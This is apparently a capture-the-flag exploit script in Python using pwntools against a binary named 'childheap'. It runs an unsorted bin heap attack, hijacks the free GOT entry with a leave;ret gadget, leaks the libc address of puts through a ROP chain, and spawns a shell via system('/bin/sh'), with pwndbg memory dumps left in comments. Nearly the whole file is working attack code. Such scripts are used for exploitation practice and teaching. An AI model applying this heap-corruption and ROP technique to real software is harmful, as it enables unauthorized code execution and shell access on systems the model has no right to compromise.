# -*- coding: utf-8 -*- 

#Attack technique: unsorted bin attack...

from pwn import *

context.log_level='debug'

def Alloc(size,data):
	s.recvuntil('> ')
	s.sendline('1')
	s.recvuntil('Input size: ')
	s.sendline(str(size))
	s.recvuntil('Input data: ')
	s.send(data)

def Free():
        s.recvuntil('> ')
        s.sendline('2')

def Modify(name,is_age,is_change):
	s.recvuntil("> ")
	s.sendline("3")
	s.recvuntil('Do you want to change age (y/n)?')
	s.sendline(is_age)
	
	if is_age is 'y':
		s.recvuntil('Input age: ')
		s.sendline('10')

	s.recvuntil('Input new name:')
	s.sendline(name)
	s.recvuntil('Do you want to change name to new one (y/n)?')
	s.sendline(is_change)

def secret(code,comment=False):
        s.recvuntil("> ")
        s.sendline("201527")
	s.recvuntil('Input secret code: ')
	s.sendline(str(code))

	if code == 1397048149:
	
		s.recvuntil('Give me your last comment:')
		s.sendline(comment)

if __name__ == '__main__':

	s=process('childheap')
	e=ELF('childheap')
	l=ELF('/lib/x86_64-linux-gnu/libc.so.6')

	main_ret=0x00000000004008F6	
	leaveret=0x400C7E
	poprdi_ret=0x400d83
	
	Alloc(0x1000-1,'A'*4) #heap alloc size 4095
	Free() #heap chunk free, This chunk will be pushed unsortedbin

	Modify('A'*4,'n','n') #fget use stdin-> heap(0x1000 size), unsortedbin is empty
	Free() #stdin free, This chunk will be pushed unsorted bin
	
	#unsorted_bin_attack
	payload=p64(0x0)
	payload+=p64(0x6020c0-0x10) #bk
	Modify(payload,'n','n')

	Alloc(0x1000-1,'B'*4095) #main_arena+88 address pushed in 0x6020c0 
	
	#Create fake unsortedbin in main_arena	
	payload=p64(0x0)
	payload+=p64(0x6020c0-0x18)
	payload+=p64(0x6020c0-0x18)
	Modify(payload,'n','y') 
		
	Free()	
	'''
	pwndbg> x/6gx 0x00007efc21e30b78
	0x7efc21e30b78 <main_arena+88>:	0x0000000001f61040	0x0000000000000000
	0x7efc21e30b88 <main_arena+104>:	0x0000000001f60000	0x00000000006020a8
	0x7efc21e30b98 <main_arena+120>:	0x00007efc21e30b88	0x00007efc21e30b88
	pwndbg> unsortedbin 
	unsortedbin

	all: 0x1f60000 —▸ 0x6020a8 ◂— 0x0
	'''

	secret(0x211) #0x6020b0->mininum size 512

	'''
	pwndbg> x/30 0x6020a8
	0x6020a8:	0x0000000000000000	0x0000000000001011 <- secret code will be heap size!!
	0x6020b8:	0x0000000000000001	0x00007f486ab55b78
	'''

	Alloc(0x200,p64(0x0)+p64(e.got['free']-0x18)) #0x6020c0 addr control , 0x6020c0 -> free@got-0x10
	
	#main function not exist leave;ret...buf we can create it!!
	Modify('A'*(0x10-2)+p64(leaveret),'n','y') #free -> leave;ret !! 

	#payload='A'*0x78+'B'*8 # -> free -> 0x400c7f    ret    <0x4242424242424242>
	payload='A'*0x78
	payload+=p64(poprdi_ret)
	payload+=p64(e.got['puts'])
	payload+=p64(e.plt['puts'])
	payload+=p64(main_ret)

	secret(1397048149,payload)
	Free() #leave;ret

	puts_libc=u64(s.recv(6).ljust(8,'\x00'))
	system_libc=puts_libc-0x2a300
	libc_base=puts_libc-0x6f690

	binsh=libc_base+list(l.search('/bin/sh\x00'))[0]

        payload='A'*0x78
        payload+=p64(poprdi_ret)
        payload+=p64(binsh)
        payload+=p64(system_libc)

	secret(1397048149,payload)
	Free() #leave;ret

	s.interactive() 
